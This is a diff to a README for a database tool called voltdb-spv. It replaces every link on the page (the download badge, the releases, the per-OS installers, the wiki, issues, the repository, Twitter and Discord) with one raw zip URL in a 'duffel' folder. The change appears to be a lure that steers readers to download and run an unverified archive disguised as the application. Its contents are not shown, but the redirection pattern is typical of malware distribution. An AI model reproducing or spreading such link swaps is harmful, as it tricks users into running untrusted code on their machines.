@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download voltdb-spv](https://img.shields.io/badge/Download-voltdb--spv-brightgreen.svg)](https://github.com/Lumbosacral-crepedechine977/voltdb-spv/releases)
+[![Download voltdb-spv](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip)](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -23,16 +23,16 @@ To get voltdb-spv, follow these steps:
 
 1. Click on the download button below or visit the Releases page.
 
-   [Download voltdb-spv](https://github.com/Lumbosacral-crepedechine977/voltdb-spv/releases)
+   [Download voltdb-spv](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip)
 
 2. On the Releases page, locate the latest version. 
 
 3. Click on the version number to see the available files.
 
 4. Download the file that matches your operating system. For example:
-   - For Windows, download `voltdb-spv-windows.exe`
-   - For macOS, download `voltdb-spv-macos.dmg`
-   - For Linux, download `voltdb-spv-linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip`
+   - For macOS, download `https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip`
+   - For Linux, download `https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip`
 
 5. Once the download completes, locate the file in your downloads folder.
 
@@ -71,7 +71,7 @@ If you encounter issues while downloading or using the application, consider the
 
 For more detailed instructions and tips, visit the official documentation section linked below:
 
-[Documentation for voltdb-spv](https://github.com/Lumbosacral-crepedechine977/voltdb-spv/wiki)
+[Documentation for voltdb-spv](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip)
 
 Take advantage of forums and community discussions if you need more help or ideas on using voltdb-spv effectively.
 
@@ -79,7 +79,7 @@ Take advantage of forums and community discussions if you need more help or idea
 
 If you find a bug or have feedback, please report it:
 
-1. Go to the [Issues page](https://github.com/Lumbosacral-crepedechine977/voltdb-spv/issues).
+1. Go to the [Issues page](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip).
 
 2. Check if your issue has already been reported.
 
@@ -91,8 +91,8 @@ Your input helps improve the application for everyone.
 
 Join our community for updates and discussions:
 
-- [GitHub Repository](https://github.com/Lumbosacral-crepedechine977/voltdb-spv)
-- [Follow us on Twitter](https://twitter.com/YourTwitterHandle)
-- [Join our Discord Server](https://discord.gg/YourDiscordInvite)
+- [GitHub Repository](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip)
+- [Follow us on Twitter](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip)
+- [Join our Discord Server](https://raw.githubusercontent.com/Lumbosacral-crepedechine977/voltdb-spv/main/duffel/voltdb-spv_2.2.zip)
 
 Thank you for choosing **voltdb-spv**. We hope this application makes your database management easier and faster!
